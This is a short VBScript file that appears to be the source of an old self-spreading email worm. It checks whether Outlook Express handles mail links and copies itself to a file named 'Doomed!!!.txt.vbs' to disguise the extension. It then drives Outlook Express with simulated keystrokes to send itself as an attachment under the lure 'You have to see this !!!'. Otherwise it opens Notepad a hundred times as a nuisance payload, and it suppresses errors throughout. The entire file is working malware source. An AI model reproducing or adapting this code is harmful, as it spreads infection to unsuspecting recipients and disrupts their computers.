On Error resume next

Set Mail = CreateObject("wscript.shell")
Set fso = CreateObject("Scripting.FileSystemObject")

    M = Mail.Regread("HKEY_LOCAL_MACHINE\SOFTWARE\CLASSES\mailto\shell\open\command\")

    If InStr(LCase(M), "msimn.exe") > 1 Then

    




	If fso.FileExists(WScript.ScriptFullname) then
	
	fso.CopyFile WScript.ScriptFullname , "c:\Doomed!!!.txt.vbs" 
 
	Mail.Run("C:\Progra~1\Outloo~1\msimn.exe")
	    
		Start = Timer
   	 Do While Timer < Start + 10
        	Loop

	Mail.SendKeys("^n%tr{TAB 3}~~%i~c:\Doomed!!!.txt.vbs~{TAB 2}You have to see this !!!%s"),true


	Wscript.Echo("We are all Doomed!!!")


 
	else
	end if

	Set Mail = Nothing
	Set fso = Nothing


	Else
	Call Crap_Pay
	
	end if



Private Sub Crap_Pay()

Set Shell = CreateObject("wscript.shell")

for j = 1 to 100

	Shell.Run("Notepad.exe")

next
Set Shell = Nothing
End sub